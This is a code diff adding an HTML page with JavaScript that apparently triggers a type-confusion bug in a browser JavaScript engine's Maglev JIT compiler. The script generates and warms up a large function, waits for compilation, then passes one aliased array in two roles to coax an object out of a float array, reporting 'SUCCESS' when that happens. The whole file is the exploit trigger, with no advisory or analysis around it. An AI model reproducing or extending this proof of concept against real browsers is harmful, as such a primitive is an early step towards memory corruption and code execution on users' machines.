@@ -1,0 +1,40 @@
+<!DOCTYPE html><html><body><script>
+let dummy = { a: 1 };
+let arr_obj = [dummy, 2.2, 3.3];
+let arr_double = [1.1, 2.2, 3.3];
+
+function create_and_warmup() {
+  let lines = [];
+  lines.push("function f0(x, v2, v3, obj) {");
+  for (let i = 0; i < 650; i++) lines.push(`  if (x === ${i}) return ${i};`);
+  lines.push(`
+    let a = v3[0];
+    v2[0] = obj;
+    return v3[1];
+  `);
+  lines.push("}");
+  lines.push("return f0;");
+  let fn = new Function(lines.join("\n"))();
+  
+  for (let i = 0; i < 20000; i++) {
+    fn(i, arr_obj, arr_double, dummy);
+  }
+  return fn;
+}
+
+async function main() {
+  let fn = create_and_warmup();
+  console.log("Warming up done. Sleeping 1500ms for Maglev...");
+  await new Promise(r => setTimeout(r, 1500));
+  
+  console.log("Now executing compiled f0 with aliasing victim...");
+  let victim = [1.1, 2.2, 3.3];
+  let res = fn(1000, victim, victim, dummy);
+  console.log("TEST RESULT: type=" + (typeof res) + " val=" + res);
+  if (typeof res === "object") {
+    console.log("🔥🔥🔥 SUCCESS! Object:", res, "🔥🔥🔥");
+  }
+  window.close();
+}
+main();
+</script></body></html>
